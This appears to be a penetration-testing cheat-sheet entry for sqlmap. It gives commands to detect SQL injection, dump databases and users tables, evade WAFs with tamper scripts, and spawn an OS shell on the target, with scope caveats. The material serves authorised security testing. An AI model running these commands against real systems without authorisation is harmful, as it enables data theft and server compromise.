# 02.07 sqlmap

> Automated SQL injection detector and exploiter — covers UNION, blind, time-based, error-based for 8+ DB engines.

## Overview

sqlmap automates SQL injection from detection to data extraction. Supports MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite, SAP MaxDB, IBM DB2, Firebird, Sybase. Includes WAF evasion via tamper scripts. Use against confirmed injection points — running blind against random parameters is noisy and often wasteful.

## Steps

- **Step 1** - Install (preinstalled on Kali).
- **Step 2** - Identify a potential injection point manually first.
- **Step 3** - Run sqlmap at low risk level first to confirm.
- **Step 4** - Escalate to dump tables only if scope allows.

## Commands

### Install

```bash
sudo apt install -y sqlmap
# or python3 -m pip install sqlmap
```

### Basic detection

```bash
sqlmap -u 'https://<TARGET>/product?id=1' --batch --random-agent
```

### Authenticated request

```bash
sqlmap -u 'https://<TARGET>/product?id=1' --cookie='session=<SESSION>' --batch
```

### Use Burp request file

```bash
# Save request from Burp Repeater (Right-click → Copy to file)
sqlmap -r request.txt --batch --random-agent
```

### Increase coverage

```bash
sqlmap -u 'https://<TARGET>/product?id=1' --batch --level=5 --risk=3 --random-agent
```

### Dump database content

```bash
sqlmap -u 'https://<TARGET>/product?id=1' --batch --dbs           # list DBs
sqlmap -u 'https://<TARGET>/product?id=1' --batch -D <DB> --tables  # list tables
sqlmap -u 'https://<TARGET>/product?id=1' --batch -D <DB> -T users --dump
```

### WAF bypass with tamper scripts

```bash
sqlmap -u 'https://<TARGET>/product?id=1' --batch \
  --tamper=between,space2comment,charunicodeencode \
  --random-agent --delay=2 --threads=1
```

### OS shell from SQLi

```bash
# Only if engagement scope permits
sqlmap -u 'https://<TARGET>/product?id=1' --batch --os-shell
sqlmap -u 'https://<TARGET>/product?id=1' --batch --os-pwn
```
